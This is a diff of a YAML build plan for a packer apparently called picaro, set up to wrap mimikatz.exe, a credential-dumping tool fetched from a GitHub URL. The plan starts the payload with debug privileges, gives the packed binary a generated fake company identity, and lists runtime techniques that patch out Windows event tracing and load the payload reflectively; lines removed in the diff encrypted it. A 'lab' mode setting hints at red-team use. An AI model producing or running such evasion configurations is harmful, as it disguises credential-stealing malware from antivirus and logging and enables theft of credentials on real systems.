@@ -1,19 +1,16 @@
 # Example plan to pack mimikatz.exe.
 # Usage: picaro build examples/plans/mimikatz.yaml
 
-schema: 4
+schema: 6
 name: mimikatz-basic
 
 build:
-  payload:
-    source: "https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe"
-    # Arguments the payload starts with; the packed binary's own args follow.
-    args:
-      - "privilege::debug"
-    # Keep the payload encrypted until the stub needs it at run time.
-    crypto:
-      algo: xchacha20poly1305
-      key: random
+  payloads:
+    mimikatz:
+      source: "https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe"
+      # Arguments the payload starts with; the packed binary's own args follow.
+      args:
+        - "privilege::debug"
 
   stub:
     # Strings strategy
@@ -38,9 +35,6 @@ build:
 
   output:
     path: ./dist/mimikatz_packed.exe
-    arch: x64
-    strip: true
-    trim_paths: all
     resources:
       version_info:
         # Fill company/product/description/versions with a generated identity.
@@ -50,6 +44,6 @@ build:
       mode: lab
 
 runtime:
-  # Preparation techniques first, then exactly one Execution technique.
+  # Preparation techniques first, then the execution technique.
   - technique: patch_etw
   - technique: reflective_loading
